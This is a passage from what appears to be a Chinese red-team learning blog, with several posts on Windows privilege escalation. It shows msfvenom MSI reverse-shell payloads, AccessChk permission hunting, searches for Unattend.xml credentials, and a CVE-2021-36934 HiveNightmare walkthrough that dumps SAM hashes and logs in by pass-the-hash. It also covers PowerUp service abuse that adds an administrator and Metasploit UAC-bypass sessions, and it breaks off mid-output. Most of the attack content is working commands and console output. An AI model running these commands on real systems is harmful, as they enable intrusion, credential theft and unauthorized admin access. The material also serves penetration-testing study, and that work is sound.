src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727175000.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&lt;命令&gt; -f msi &gt; calc.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者以 SYSTEM 权限上线</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.65 lport&#x3D;4444 –f msi -o shell.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSI-Wrapper"><a href="#MSI-Wrapper" class="headerlink" title="MSI Wrapper"></a>MSI Wrapper</h3><p>MSI Wrapper 是一个操作简单直观的 MSI 安装包生成工具，我们可以使用该工具制作一个包含木马的 MSI 安装包。</p><p>选择自己要导入的 EXE 木马文件位置和导出 MSI 安装包位置。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728090315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>设置运行时提升权限</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728091810.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上</p><p>开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728092010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-计划任务"><a href="#0x03-计划任务" class="headerlink" title="0x03 计划任务"></a>0x03 计划任务</h1><p>使用以下命令可以看到当前计算机的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。</p><p>AccessChk 下载地址：<a href="https://download.sysinternals.com/files/AccessChk.zip">https://download.sysinternals.com/files/AccessChk.zip</a></p><p>在第一次使用时，会弹出许可协议对话框，可以使用 /accepteula 进行关闭</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe &#x2F;accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行以下命令，查看指定目录的权限配置情况：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -dqv &quot;C:\Program Files&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果攻击者以高权限运行的任务所在目录有写权限，就可以使用恶意程序覆盖原来的程序，这样计划任务下次运行时，就会以高权限运行恶意程序。</p><p>列出每个驱动器下所有权限配置不当的文件夹：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -uwdqs Users c:\ .\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>列出每个驱动器下所有权限配置不当的文件：</p><pre class="line-numbers language-none"><code class="language-none">.\accesschk.exe -uwqs Users c:\*.*.\accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x04-自动安装配置文件"><a href="#0x04-自动安装配置文件" class="headerlink" title="0x04 自动安装配置文件"></a>0x04 自动安装配置文件</h1><p>管理员在对内网中多台机器进行环境配置时，通常不会一台一台的配置，往往会采用脚本批量化的方式。</p><p>在这个过程中，可能就会有一些包含安装配置信息的文件，比如在这些文件中包含了账号、密码，常见的文件路径如下：</p><pre class="line-numbers language-none"><code class="language-none">C:\sysprep.infC:\syspreg\sysprep.xmlC:\Windows\system32\sysprep.infC:\windows\system32\sysprep\sysprep.xmlC:\unattend.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattended.xmlC:\Windows\Panther\Unattend\Unattended.xmlC:\Windows\Panther\Unattend\Unattend.xmlC:\Windows\System32\Sysprep\Unattend.xmlC:\Windows\System32\Sysprep\Panther\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者直接全局搜索 Unattend.xml 文件</p><pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s C:\Unattend.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以直接使用 MSF 的 post/windows/gather/enum_unattend 模块</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;enum_unattendset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728124041.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/SYSTEM/254836.html">https://www.freebuf.com/articles/SYSTEM/254836.html</a></p><p><a href="https://www.freebuf.com/articles/network/250827.html">https://www.freebuf.com/articles/network/250827.html</a></p><p><a href="https://gist.github.com/sckalath/8dacd032b65404ef7411">https://gist.github.com/sckalath/8dacd032b65404ef7411</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现</title>
      <link href="//210725-074847.html"/>
      <url>//210725-074847.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>7 月 20 日，微软确认了一个新的本地提权漏洞，该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本。</p><p>不过值得注意的是该漏洞不影响 Windows Server 版本。</p><p>对于这个漏洞安全研究成员将其称为 HiveNightmare 或者 SeriousSAM ，该漏洞允许低权限的用户访问 Windows 系统文件，成功利用此漏洞的攻击者可以使用 SYSTEM 特权运行任意代码。</p><p>根据微软的介绍，出现本地提权漏洞是由于多个系统文件（包括安全账户管理器数据库SAM）过度许可访问控制列表所导致。</p><p>目前 POC 和 EXP 已经被公开，利用公开的 POC 可以低权限账号读取 SAM 等文件。</p><h1 id="0x01-检查是否易受攻击"><a href="#0x01-检查是否易受攻击" class="headerlink" title="0x01 检查是否易受攻击"></a>0x01 检查是否易受攻击</h1><p>执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">icacls C:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果输出 BUILTIN\Users:(I)(RX) 表示该系统易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723110132.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723111446.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>EXP 地址为：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p>作者编译好的 exe 文件：<a href="https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe">https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe</a></p><p>直接将作者编译好的 HiveNightmare.exe 拷贝到目标系统上执行，这里以 Windows 10 1809 为例。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723132944.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在低权限账号下，成功利用 CVE-2021–36934 读取到了 SAM、SECURITY、SYSTEM 三个文件。</p><p>除了 HiveNightmare 项目外，ShadowSteal 项目也能实现同样的效果，不过该项目需要编译使用，编译步骤如下：</p><p>在 Linux 下运行以下命令，以 Kali 为例。</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install nimnimble install zippy argparsenimble install winimsudo apt-get install mingw-w64git clone https:&#x2F;&#x2F;github.com&#x2F;HuskyHacks&#x2F;ShadowSteal.git &amp;&amp; cd ShadowStealmake &amp;&amp; cd bin&#x2F; &amp;&amp; ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将编译好的 ShadowSteal.exe 放到目标系统上直接执行即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723141315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在获得  SAM、SECURITY、SYSTEM 文件后，我们就可以使用 secretsdump.py 获取目标用户的 hash 了。</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket.gitcd impacket&#x2F;examplespython3 secretsdump.py -sam SAM-2021-06-17 -system SYSTEM-2021-06-17 -security SECURITY-2021-06-17 LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723144111.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>再使用 psexec.py 直接利用 administrator 的 hash 登录管理员账户，获得 SYSTEM 权限会话。</p><pre class="line-numbers language-none"><code class="language-none">python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@172.16.214.10 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210723155856.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>微软目前仍在研究该漏洞（编号为CVE-2021-36934），还未发布补丁更新。不过微软提供了一个临时性的解决方案。</p><p>1、限制对 %windir%\system32\config 内容的访问</p><p>​    以管理员身份打开命令提示符或 Windows PowerShell，运行以下命令：icacls %windir%\system32\config*.* /inheritance:e</p><p>2、删除卷影复制服务 (VSS) 卷影副本</p><p>​    删除限制访问 %windir%\system32\config 之前存在的任何系统还原点和卷影卷，创建一个新的系统还原点（如果需要）。</p><p>​    不过在操作时需要注意的是，从系统中删除卷影副本会影响系统和文件的“恢复“操作。</p><blockquote><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg">https://mp.weixin.qq.com/s/zSHwBUe-1ObumPt6v0pxMg</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247494395&idx=1&sn=c40e68e018c2112d7e3ce74b9a55c724">https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&amp;mid=2247494395&amp;idx=1&amp;sn=c40e68e018c2112d7e3ce74b9a55c724</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 提权漏洞 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】15、系统服务权限配置不当利用</title>
      <link href="//210722-173157.html"/>
      <url>//210722-173157.html</url>
      
        <content type="html"><![CDATA[<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p><p>在 PowerShell 中导入并执行脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerUp.ps1Invoke-AllChecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuidServer username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p><p>利用步骤如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissionsset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.7.1set lport 4444set session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到会话直接被提升到了 SYSTEM 权限。</p><blockquote><p>参考文章：</p><p><a href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】14、发现主机缺失补丁</title>
      <link href="//210706-155005.html"/>
      <url>//210706-155005.html</url>
      
        <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。</p><h2 id="1、手工发现缺失补丁"><a href="#1、手工发现缺失补丁" class="headerlink" title="1、手工发现缺失补丁"></a>1、手工发现缺失补丁</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>直接运行 systeminfo 命令，在「修补程序」（英文：Hotfix(s) ）处可以看到已安装的补丁。</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt; systeminfo……内容过多，此处省略……修补程序: 安装了 2 个修补程序。         [01]: KB2999226         [02]: KB976902……内容过多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>运行以下命令，同样可以看到当前系统打补丁的情况，显示的信息比 systeminfo 更详细直观。</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotfixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\teamssix&gt;wmic qfe get Caption,Description,HotfixID,InstalledOnCaption                                     Description  HotFixID   InstalledOnhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2999226  Update       KB2999226  11&#x2F;26&#x2F;2020http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;976902   Update       KB976902   11&#x2F;21&#x2F;2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知道了系统安装了哪些补丁，也就能反推出系统可能存在的漏洞了。</p><h2 id="2、自动发现缺失补丁"><a href="#2、自动发现缺失补丁" class="headerlink" title="2、自动发现缺失补丁"></a>2、自动发现缺失补丁</h2><h3 id="Sherlock-脚本"><a href="#Sherlock-脚本" class="headerlink" title="Sherlock 脚本"></a>Sherlock 脚本</h3><p>Sherlock 是一个在 Windows 下能够快速发现目标系统可能存在可被用于提权的漏洞的 PowerShell 脚本。</p><p>Sherlock 项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><p>导入脚本</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Sherlock.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Sherlock 命令</p><pre class="line-numbers language-none"><code class="language-none">Find-ALLVulns搜索所有未安装的补丁Find-MS16032搜索单个漏洞<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在已经获取到目标会话后，比如这里的会话 Seesion ID 为 1，使用 post/windows/gather/enum_patches 模块可直接查看当前系统补丁信息。</p><pre class="line-numbers language-none"><code class="language-none">msf6 exploit(multi&#x2F;handler) &gt; use post&#x2F;windows&#x2F;gather&#x2F;enum_patchesmsf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; set session 1session &#x3D;&gt; 1msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; run[+] KB2999226 installed on 11&#x2F;26&#x2F;2020[+] KB976902 installed on 11&#x2F;21&#x2F;2010[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用 MSF 发现目标可用提权漏洞，然后进行提权</p><p>首先查看下当前会话权限</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 6 created.组信息-----------------组名                                   类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators                 别名   S-1-5-32-544 只用于拒绝的组BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                             已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192  必需的组, 启用于默认, 启用的组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到当前权限为 Medium Mandatory Level，即普通权限</p><p>我们使用 post/multi/recon/local_exploit_suggester 模块检测下当前系统可利用的提权漏洞</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background[*] Backgrounding session 1...msf6 post(windows&#x2F;gather&#x2F;enum_patches) &gt; use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggestermsf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 1session &#x3D;&gt; 1msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; run[*] 172.16.214.4 - Collecting local exploits for x86&#x2F;windows...[*] 172.16.214.4 - 38 exploit checks are being tried...[+] 172.16.214.4 - exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr: The target appears to be vulnerable.[*] Post module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到提示存在 exploit/windows/local/bypassuac_eventvwr 模块可被利用</p><pre class="line-numbers language-none"><code class="language-none">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; set session 1session &#x3D;&gt; 1msf6 exploit(windows&#x2F;local&#x2F;bypassuac_eventvwr) &gt; run[*] Started reverse TCP handler on 10.101.22.38:4444[*] UAC is Enabled, checking level...[+] Part of Administrators group! Continuing...[+] UAC is set to Default[+] BypassUAC can bypass this setting, continuing...[*] Configuring payload and stager registry keys ...[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.[*] Sending stage (175174 bytes) to 172.16.214.4[*] Meterpreter session 2 opened (10.101.22.38:4444 -&gt; 172.16.214.4:49160) at 2021-07-06 15:38:08 +0800[*] Cleaning up registry keys ...meterpreter &gt; execute -if &quot;whoami &#x2F;groups&quot;Process 3048 created.Channel 1 created.组信息-----------------组名                                 类型   SID          属性&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组BUILTIN\Administrators               别名   S-1-5-32-544 必需的组, 启用于默认, 启用的组, 组的所有者BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组控制台登录                           已知组 S-1-2-1      必需的组, 启用于默认, 启用的组NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组NT AUTHORITY\NTLM Authentication     